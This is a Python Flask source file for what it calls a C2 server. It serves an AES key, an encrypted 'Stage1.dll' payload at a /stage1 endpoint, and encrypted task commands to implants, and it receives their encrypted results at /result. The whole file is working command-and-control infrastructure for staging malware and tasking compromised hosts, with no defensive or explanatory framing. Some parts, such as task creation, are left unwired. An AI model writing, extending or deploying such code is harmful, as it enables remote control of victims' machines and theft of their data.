from flask import Flask, request, jsonify, Response
import base64, json, os, uuid
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

app = Flask(__name__)

# --- Generated once at startup ---
KEY = os.urandom(32)        # 32‑byte AES key
IV  = os.urandom(16)        # 16‑byte IV
tasks = {}                  # task_id -> {cmd, args, status}
STAGE1_DLL = open("Stage1.dll", "rb").read()

def encrypt_data(data: bytes) -> str:
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
    enc = cipher.encryptor()
    ct = enc.update(data) + enc.finalize()
    return base64.b64encode(IV + ct).decode()

def decrypt_data(b64data: str) -> bytes:
    raw = base64.b64decode(b64data)
    iv, ct = raw[:16], raw[16:]
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(iv), backend=default_backend())
    dec = cipher.decryptor()
    return dec.update(ct) + dec.finalize()

def make_task(cid: str, args: str = None) -> str:
    payload = json.dumps({"cmd": cid, "args": args or ""}).encode()
    return encrypt_data(payload)

@app.route("/key")
def key():
    return jsonify({"key": base64.b64encode(KEY).decode(), "iv": base64.b64encode(IV).decode()})

@app.route("/stage1")
def stage1():
    return Response(encrypt_data(STAGE1_DLL), mimetype="text/plain")

@app.route("/task/<task_id>")
def get_task(task_id):
    task = tasks.get(task_id)
    if not task:
        return Response("nf", status=404)
    return jsonify({"id": task_id, "cmd": task["cmd"], "args": task.get("args"), "status": task["status"]})

@app.route("/result/<task_id>", methods=["POST"])
def receive_result(task_id):
    data = request.form.get("data")
    if not data:
        return "", 400
    try:
        plain = decrypt_data(data)
        print(" [C2] Result:", plain.decode())
    except Exception as e:
        print(" [C2] Decrypt error:", e)
    tasks[task_id]["status"] = "complete"
    return "", 204

if __name__ == "__main__":
    # python c2_server.py  (HTTP on 8080; switch to HTTPS by enabling Flask-TLS)
    app.run(host="0.0.0.0", port=8080)